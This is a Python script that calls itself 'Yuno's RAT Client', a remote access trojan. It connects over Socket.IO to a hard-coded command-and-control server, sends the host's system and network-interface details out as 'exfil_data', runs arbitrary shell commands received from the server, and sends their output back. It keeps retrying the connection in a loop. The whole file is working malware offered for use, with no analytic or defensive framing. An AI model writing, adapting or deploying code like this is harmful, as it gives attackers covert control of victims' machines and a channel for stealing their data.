#!/usr/bin/env python3
import platform
import subprocess
import json
import time
from socketio import Client
import netifaces

# Server settings
SERVER_URL = "https://c2-backend-wily.onrender.com"  # Your Render URL

def get_system_info():
    """Gather system information."""
    info = {
        "hostname": platform.node(),
        "os": platform.system(),
        "os_version": platform.release(),
        "architecture": platform.machine(),
    }
    return info

def get_network_info():
    """Gather network interface information."""
    interfaces = netifaces.interfaces()
    network_info = {}
    for iface in interfaces:
        addrs = netifaces.ifaddresses(iface)
        if netifaces.AF_INET in addrs:
            for addr in addrs[netifaces.AF_INET]:
                network_info[iface] = addr.get("addr", "Unknown")
    return network_info

def execute_command(command):
    """Execute a system command and return the output."""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout + result.stderr
    except Exception as e:
        return f"Error executing command: {e}"

def main():
    sio = None
    try:
        sio = Client()
        
        @sio.event
        def connect():
            print("[*] Connected to RAT server")
            # Exfiltrate system and network info
            system_info = get_system_info()
            network_info = get_network_info()
            exfil_data = {
                "system": system_info,
                "network": network_info
            }
            sio.emit('exfil_data', json.dumps(exfil_data))
            print("[*] Exfiltrated data sent to RAT server")

        @sio.event
        def disconnect():
            print("[*] Disconnected from RAT server")

        @sio.event
        def connect_error(data):
            print(f"[!] Connection failed: {data}")

        @sio.event
        def command(data):
            print(f"[*] Received command: {data}")
            if data.strip() == "exit":
                print("[*] Received exit command")
                sio.disconnect()
                return
            # Execute the command and send back the result (if needed)
            output = execute_command(data)
            print(f"[*] Executed command: {data}")
            # Optionally send the output back
            sio.emit('exfil_data', json.dumps({"command_output": output}))

        while True:
            try:
                sio.connect(SERVER_URL, transports=['websocket'])
                sio.wait()
                break
            except Exception as e:
                print(f"[!] Connection failed: {e}")
                print("[*] Retrying in 5 seconds...")
                time.sleep(5)
    finally:
        if sio is not None:
            sio.disconnect()

if __name__ == "__main__":
    print("=== Yuno's RAT Client ===")
    print("A remote access client by Yuno\n")
    main()